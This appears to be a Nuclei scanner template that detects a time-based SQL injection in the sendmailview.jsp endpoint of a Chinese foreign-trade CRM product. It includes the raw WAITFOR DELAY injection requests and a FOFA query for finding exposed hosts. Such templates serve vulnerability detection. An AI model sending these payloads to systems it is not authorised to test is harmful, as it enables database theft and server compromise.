http:
    - matchers:
        - condition: and
          dsl:
            - duration_1>=4 && duration_1<=5
            - duration_2>=8 && duration_2<=9
          type: dsl
      raw:
        - |
          GET /wap/common/sendmailview.jsp?commonid=1';WAITFOR+DELAY+'0:0:2'-- HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0
        - |
          GET /wap/common/sendmailview.jsp?commonid=1';WAITFOR+DELAY+'0:0:4'-- HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0
id: weidawaimao-sendmailview_jsp-sql-time
info:
    author: Superhero
    description: |-
        fofa: title="维达外贸客户关系管理系统"
        维达外贸客户关系管理系统 sendmailview.jsp 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
    name: 维达外贸客户关系管理系统 sendmailview.jsp SQL注入漏洞
    reference:
        - https://mp.weixin.qq.com/s/7xlFKhFfEbFuFcS712v21Q
    severity: high
    tags:
        - WAP
        - Sendmail
